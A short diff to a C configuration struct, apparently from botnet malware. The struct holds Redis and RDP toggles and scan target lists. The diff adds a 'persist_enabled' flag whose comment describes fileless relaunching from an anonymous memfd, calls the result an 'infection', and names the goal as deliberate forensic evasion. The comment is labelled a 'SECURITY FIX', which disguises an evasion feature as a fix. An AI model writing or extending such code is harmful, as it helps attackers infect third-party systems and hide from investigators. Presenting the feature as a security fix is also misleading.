@@ -128,6 +128,13 @@ typedef struct {
     uint8_t redis_enabled;
     uint8_t rdp_enabled;
 
+    /* SECURITY FIX (#84): RAM-only fileless operation. When 0, no
+     * persistence is installed and (on Linux) the bot relaunches itself
+     * from an anonymous memfd so the running binary has no disk-backed
+     * executable. Reboot loses the infection by design — deliberate
+     * forensic evasion, not a bug. */
+    uint8_t persist_enabled;
+
     /* Scan targets (explicit IPs/subnets, override default subnets) */
     int scan_target_count;
     char scan_targets[16][256];
